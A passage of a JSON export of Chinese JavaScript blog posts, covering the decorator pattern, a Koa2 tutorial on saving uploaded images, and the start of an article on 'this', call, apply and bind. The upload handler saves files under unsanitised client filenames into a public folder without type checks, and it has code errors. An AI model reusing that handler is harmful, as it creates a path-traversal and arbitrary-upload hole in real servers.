class=\"hljs-keyword\"\u003ethis\u003c/span\u003e);\n};\nnumSelect.onchange = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    mediator.changed(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e);\n};\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"5-\"\u003e5.装饰者模式\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e装饰者模式的定义：在不改变对象自身的基础上，在程序运行期间给对象动态地添加方法。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e例如：现有4种型号的自行车分别被定义成一个单独的类，如果给每辆自行车都加上前灯、尾灯、铃铛这3个配件，如果用类继承的方式，需要创建4*3=12个子类。但如果通过装饰者模式，只需要创建3个类。\u003c/p\u003e\n\u003cp\u003e装饰者模式适用的场景：原有方法维持不变，在原有方法上再挂载其他方法来满足现有需求；函数的解耦，将函数拆分成多个可复用的函数，再将拆分出来的函数挂载到某个函数上，实现相同的效果但增强了复用性。\u003c/p\u003e\n\u003cp\u003e例：用AOP装饰函数实现装饰者模式\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\"\u003e\u003cspan class=\"hljs-built_in\"\u003eFunction\u003c/span\u003e.prototype.before = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ebeforefn\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e self = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e;    \u003cspan class=\"hljs-comment\"\u003e//保存原函数引用\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{  \u003cspan class=\"hljs-comment\"\u003e//返回包含了原函数和新函数的 '代理函数'\u003c/span\u003e\n        beforefn.apply(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e, \u003cspan class=\"hljs-built_in\"\u003earguments\u003c/span\u003e);    \u003cspan class=\"hljs-comment\"\u003e//执行新函数，修正this\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e self.apply(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e,\u003cspan class=\"hljs-built_in\"\u003earguments\u003c/span\u003e);  \u003cspan class=\"hljs-comment\"\u003e//执行原函数\u003c/span\u003e\n    }\n}\n\u003cspan class=\"hljs-built_in\"\u003eFunction\u003c/span\u003e.prototype.after = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eafterfn\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e self = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e ret = self.apply(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e,\u003cspan class=\"hljs-built_in\"\u003earguments\u003c/span\u003e);\n        afterfn.apply(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e, \u003cspan class=\"hljs-built_in\"\u003earguments\u003c/span\u003e);\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e ret;\n    }\n}\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e func = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'2'\u003c/span\u003e);\n}\n\u003cspan class=\"hljs-comment\"\u003e//func1和func3为挂载函数\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e func1 = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e);\n}\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e func3 = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'3'\u003c/span\u003e);\n}\nfunc = func.before(func1).after(func3);\nfunc();\u003c/code\u003e\u003c/pre\u003e","buildTime":"1514885764.5427","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c0703"},"id":"5a363340f265da430a50a8c5","author":{"$oid":"5a4b770f19da8721f49c06f9"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/17/16064e73913ae837?w=778\u0026h=327\u0026f=png\u0026s=99161"],"screenShot":null}],"title":"express，koa2等node处理前端上传图片并保存到文件中","meta":{"likeCount":0},"tag":["Node.js","Vue.js","HTML","CSS","Express","koa"],"comment":[],"shortContent":"在另个项目中，同样的代码却报错了... 我也是一脸懵逼","content":"\u003cblockquote\u003e\n\u003cp\u003e在实际的项目中，图片的处理往往是最麻烦的，无论是前后台，我自己也试手了一两个图片上传的小项目，把步骤写下来，以后自己忘记可以返回来看一下，同时希望能够帮到小伙伴们...\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e前端网页\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e框架： vue + iview等组件来实现图片的file功能 + koa2\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e运用iview的Upload组件\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://user-gold-cdn.xitu.io/2017/12/17/16064c8e3968bb03\"\u003eUpload 上传\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eupload组件方法方式就不过多一一赘述了，在这里提几点关键点\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;Upload\n:on-format-error=\u003cspan class=\"hljs-string\"\u003e\"handleFormatError\"\u003c/span\u003e\n    :before-upload=\u003cspan class=\"hljs-string\"\u003e\"handleBeforeUpload\"\u003c/span\u003e\n    :data=\u003cspan class=\"hljs-string\"\u003e'uploadData'\u003c/span\u003e // 传参\n    multiple\n    action=\u003cspan class=\"hljs-string\"\u003e\"//localhost:6001/blog/admin/edit/image\"\u003c/span\u003e // http请求路径\n\u0026gt;\u0026lt;/Upload\u0026gt;\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003edata\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\n        uploadData: {\n        \u0009url: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e, // 图片二进制的data的url\n        \u0009articleId: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e // 这个详情的ID 后台与他绑在一起\n        }\n    }\n}\n// 利用浏览器的FileReader的特性压缩并上传图片\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ehandleBeforeUpload\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e reader = new FileReader();\n    reader.readAsDataURL(file);\n    reader.onloadend = (e)=\u0026gt; {\n        file.url = reader.result;\n        this.uploadData.articleId = this.\u003cspan class=\"hljs-variable\"\u003e$route\u003c/span\u003e.query.id;\n        this.uploadData.url = file.url;\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e前端总结： 运用iview组件来构造file上传图片本身不难，官方了解api多次尝试就可以了\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003ekoa后台node框架\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003enode后台处理图片，查了网上资料，采用了formidable的包来处理图片的，express采用formidable的npm包，而koa2采用了koa-formidable的npm包，两者没多大区别，koa-formidable只不过是formidable的再度封装和运载koa2的框架上而已\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch4 class=\"heading\"\u003e我们先看浏览器查看http的请求\u003c/h4\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/17/16064e73913ae837?w=778\u0026amp;h=327\u0026amp;f=png\u0026amp;s=99161\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e图片的http请求为什么跟别的不一样，就是不一样，我们不一样，哈哈！别钻牛角，适应就行了\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e1.引入koa-formidable\u003c/li\u003e\n\u003cli\u003e2.\u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/koa-formidable\"\u003e下载地址，API\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003elet form = formidable.parse(request);\u003c/li\u003e\n\u003cli\u003e图片重命名fs,放入public文件中\u003c/li\u003e\n\u003cli\u003e图片路径放回给前端\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e步骤并不复杂，只是本人对于node的模块不太熟悉，比如fs path模块，希望以后多多做node小项目，熟悉起来...\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// app.js\nconst Router = require(\u003cspan class=\"hljs-string\"\u003e'koa-router'\u003c/span\u003e);\nconst router = new Router();\nconst serve = require(\u003cspan class=\"hljs-string\"\u003e\"koa-static\"\u003c/span\u003e);\n\nconst formidable = require(\u003cspan class=\"hljs-string\"\u003e'koa-formidable'\u003c/span\u003e); // 图片处理\nconst fs = require(\u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e); // 图片路径\nconst path = require(\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e); // 图片路径\n\napp.use(serve(__dirname))  // 设置静态文件\n\n// 新建文件，可以去百度fs模块\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e mkdirs = (dirname, callback)=\u0026gt; {\n    fs.exists(dirname, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(exists) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (exists) {\n            callback();\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            mkdirs(path.dirname(dirname), \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n                fs.mkdir(dirname, callback);\n            });\n        }\n    });\n};\n\nrouter.post(\u003cspan class=\"hljs-string\"\u003e'/upload/image'\u003c/span\u003e, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (ctx, next) {\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e form = formidable.parse(request);\n    \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eformImage\u003c/span\u003e\u003c/span\u003e() {\n    \u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e new Promise((resolve, reject) =\u0026gt; {\n    \u0009\u0009form((opt, {fields, files})=\u0026gt; {\n        \u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e url = fields.url;\n        \u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e articleId = fields.articleId;\n        \u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e filename = files.file.name;\n        \u0009console.log(files.file.path);\n        \u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e uploadDir = \u003cspan class=\"hljs-string\"\u003e'public/upload/'\u003c/span\u003e;\n    \u0009        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e avatarName = Date.now() + \u003cspan class=\"hljs-string\"\u003e'_'\u003c/span\u003e + filename;\n    \u0009        mkdirs(\u003cspan class=\"hljs-string\"\u003e'public/upload'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n                \u0009fs.renameSync(files.file.path, uploadDir + avatarName); //重命名\n                \u0009resolve(config[env].host + \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e + uploadDir + avatarName)\n                \u0009// http://localhost:6001/public/upload/1513523744257_WX20171205-150757.png\n                })\n            })\n    \u0009})\n    }\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e url = await formImage();\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {flag: \u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e,msg:\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,data: url} // 路径返回给前端\n});\n\napp\n  .use(router.routes())\n  .use(router.allowedMethods());\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e要点\u003c/h3\u003e\n\u003cbr\u003e\n\u003ch4 class=\"heading\"\u003e1.设置静态文件 app.use(serve(__dirname))\u003c/h4\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e根据个人喜好设置静态路径\n默认的设置方法： \napp.use(serve(__dirname) + \u003cspan class=\"hljs-string\"\u003e'/public'\u003c/span\u003e) \nresolve(config[env].host + \u003cspan class=\"hljs-string\"\u003e'/upload/'\u003c/span\u003e + avatarName)\n\n也可以这样设置,\napp.use(serve(__dirname) + \u003cspan class=\"hljs-string\"\u003e'/public/upload'\u003c/span\u003e) \nresolve(config[env].host + \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e + avatarName)\n\u003c/code\u003e\u003c/pre\u003e\u003cbr\u003e\n\u003ch4 class=\"heading\"\u003e2.fs.exists新建文件，用于存放图片\u003c/h4\u003e\n\u003cp\u003e新建一个匿名函数来回调判断有无该文件，有则存入，无则新建文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e mkdirs = (dirname, callback)=\u0026gt; {\n    fs.exists(dirname, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(exists) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (exists) {\n            callback();\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            mkdirs(path.dirname(dirname), \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n                fs.mkdir(dirname, callback);\n            });\n        }\n    });\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cbr\u003e\n\u003ch4 class=\"heading\"\u003e3.koa框架存在异步，所以必须用await来终结异步操作\u003c/h4\u003e\n\u003cp\u003e至于async/await可以去百度一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eformImage\u003c/span\u003e\u003c/span\u003e(){\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e new Promise((resolve)=\u0026gt; {\n        // 处理图片\n        resolve(url)\n    })\n}\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e url = await formImage();\n\u003c/code\u003e\u003c/pre\u003e\u003cbr\u003e\n\u003ch4 class=\"heading\"\u003e4.formidable处理图片，获取图片\u003c/h4\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/koa-formidable\"\u003eformidable API\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e form = formidable.parse(request);\nform((opt, obj)=\u0026gt; {\n    // 代码如上\n})\n// 因为obj是个对象并有fields, files两个参数,那我直接这样处理：\nform((opt, {fields, files})=\u0026gt; {\n    // 代码如上\n    // 上面的代码最重要的就是下面这一句 \n    // fs.renameSync(opt1,opt2) opt1 form处理的图片路径而不是fileds.url二进制的路径， opt2则是重命名的图片名称\n    fs.renameSync(files.file.path, uploadDir + avatarName);\n})\n\n做完就可以 ctx.body = {data: url, msg: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e, flag: \u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e} 返回给前端\n\u003c/code\u003e\u003c/pre\u003e\u003cbr\u003e\n\u003ch4 class=\"heading\"\u003e在另个项目中，同样的代码却报错了... 我也是一脸懵逼\u003c/h4\u003e\n\u003cp\u003e以上是在mac笔记本操作，没有发现错误，但在window系统下却发现图片上传不成功，一个致命的错误\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003efs.js:439\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e binding.rename(pathModule._makeLong(oldPath),\n                 ^\nError: EXDEV, cross-device link not permitted \u003cspan class=\"hljs-string\"\u003e'C:\\Users\\CLi\\AppData\\Local\\Temp\\df99513a93a1cbfbc26e076f8ae08b92'\u003c/span\u003e\n    at Object.fs.renameSync (fs.js:439:18)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查询了报错的原因：是跨分区重命名文件，会有权限问题\u003c/p\u003e\n\u003cp\u003e网友解决方法之一：\u003ca target=\"_blank\" href=\"https://www.crifan.com/node_js_use_fs_renamesync_error_exdev_cross_device_link_not_permitted/#comments\"\u003eNode.js中所用的fs.renameSync出错：Error: EXDEV, cross-device link not permitted\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e用了以上文章的解决方法： 也报错了 \u003ccode\u003eutil.pump is not undefined\u003c/code\u003e,这下懵逼了\u003cbr\u003e\n用了node的\u003ccode\u003epipe\u003c/code\u003e流方法\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003eStream = fs.createReadStream(files.file.path)\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e writeStream = fs.createWriteStream(uploadDir + avatarName);\n\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003eStream.pipe(writeStream);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eexports.editImages = async(ctx, next)=\u0026gt; {\n\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e form = formidable.parse(ctx.request);\n    form.encoding = \u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e;\n    form.keepExtensions = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e; //保留后缀\n    mkdirs(\u003cspan class=\"hljs-string\"\u003e'public/upload'\u003c/span\u003e);\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e imgPlay = new Promise((resolve, reject) =\u0026gt; {\n\u0009form((opt, {fields, files})=\u0026gt; {\n\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e articleId = fields.articleId;\n\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e filename = files.file.name;\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e avatarName = Date.now() + \u003cspan class=\"hljs-string\"\u003e'_'\u003c/span\u003e + filename;\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003eStream = fs.createReadStream(files.file.path)\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e writeStream = fs.createWriteStream(uploadDir + avatarName);\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003eStream.pipe(writeStream);\n                // fs.rename(files.file.path, uploadDir + avatarName); //window报错了重命名\n        \u0009resolve({\n        \u0009\u0009url: config[env].host + \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e + uploadDir + avatarName\n        \u0009})\n        \u0009// http://localhost:6001/public/upload/1513523744257_WX20171205-150757.png\n    })\n    });\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e imageData = await imgPlay;\n\u0009ctx.body = {flag: \u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e ,msg:\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,data: imageData}\n}\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e完美解决跨平台的图书上传问题\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e项目中还有不如，如：前端上传图片的压缩问题，涉及多张上传问题，都没有实践，以后继续更新不足\u003c/strong\u003e\u003c/p\u003e\n\u003cbr\u003e\n\u003cbr\u003e\n这是我试水node的小项目的案例，请多指教\n\u003cp\u003e项目github地址：\u003ca target=\"_blank\" href=\"https://github.com/Jaction/blog\"\u003ehttps://github.com/Jaction/blog\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514878381.9447","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c0708"},"id":"59bfe84351882531b730bac2","author":{"$oid":"5a4b770f19da8721f49c06f0"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"this、apply、call、bind","meta":{"likeCount":0},"tag":["JavaScript","前端"],"comment":[],"shortContent":"这又是一个面试经典问题~/(ㄒoㄒ)/~~也是 ES5中众多坑中的一个，在 ES6 中可能会极大避免 this 产生的错误，但是为了一些老代码的维护，最好还是了解一下 this 的指向和 call、apply、bind 三者的区别。 在 ES5 中，其实 this 的指向，始终…","content":"\u003cp\u003e这又是一个面试经典问题~/(ㄒoㄒ)/~~也是 ES5中众多坑中的一个，在 ES6 中可能会极大避免 this 产生的错误，但是为了一些老代码的维护，最好还是了解一下 this 的指向和 call、apply、bind 三者的区别。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本文首发于我的个人网站：\u003ca href=\"http://cherryblog.site/\" target=\"_blank\"\u003ehttp://cherryblog.site/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch1 id=\"this-\"\u003ethis 的指向\u003c/h1\u003e\n\u003cp\u003e在 ES5 中，其实 this 的指向，始终坚持一个原理：\u003cstrong\u003ethis 永远指向最后调用它的那个对象\u003c/strong\u003e，来，跟着我朗读三遍：\u003cstrong\u003ethis 永远指向最后调用它的那个对象，this 永远指向最后调用它的那个对象，this 永远指向最后调用它的那个对象\u003c/strong\u003e。记住这句话，this 你已经了解一半了。\u003c/p\u003e\n\u003cp\u003e下面我们来看一个最简单的例子：\u003cbr\u003e例 1：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ea\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e;\n\n        \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);          \u003cspan class=\"hljs-comment\"\u003e// windowsName\u003c/span\u003e\n\n        \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"inner:\"\u003c/span\u003e + \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e);    \u003cspan class=\"hljs-comment\"\u003e// inner: Window\u003c/span\u003e\n    }\n    a();\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"outer:\"\u003c/span\u003e + \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e)         \u003cspan class=\"hljs-comment\"\u003e// outer: Window\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个相信大家都知道为什么 log 的是 windowsName，因为根据刚刚的那句话“\u003cstrong\u003ethis 永远指向最后调用它的那个对象\u003c/strong\u003e”，我们看最后调用 \u003ccode\u003ea\u003c/code\u003e 的地方 \u003ccode\u003ea();\u003c/code\u003e，前面没有调用的对象那么就是全局对象 window，这就相当于是 \u003ccode\u003ewindow.a()\u003c/code\u003e；注意，这里我们没有使用严格模式，如果使用严格模式的话，全局对象就是 \u003ccode\u003eundefined\u003c/code\u003e，那么就会报错 \u003ccode\u003eUncaught TypeError: Cannot read property \u0026#39;name\u0026#39; of undefined\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e再看下这个例子：\u003cbr\u003e例 2：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003efn\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);      \u003cspan class=\"hljs-comment\"\u003e// Cherry\u003c/span\u003e\n        }\n    }\n    a.fn();\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在这个例子中，函数 fn 是对象 a 调用的，所以打印的值就是 a 中的 name 的值。是不是有一点清晰了呢~\u003c/p\u003e\n\u003cp\u003e我们做一个小小的改动：\u003cbr\u003e例 3：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003efn\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);      \u003cspan class=\"hljs-comment\"\u003e// Cherry\u003c/span\u003e\n        }\n    }\n    \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.a.fn();\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里打印 Cherry 的原因也是因为刚刚那句话“\u003cstrong\u003ethis 永远指向最后调用它的那个对象\u003c/strong\u003e”，最后调用它的对象仍然是对象 a。\u003c/p\u003e\n\u003cp\u003e我们再来看一下这个例子：\u003cbr\u003e例 4：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\n        \u003cspan class=\"hljs-comment\"\u003e// name: \"Cherry\",\u003c/span\u003e\n        fn : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);      \u003cspan 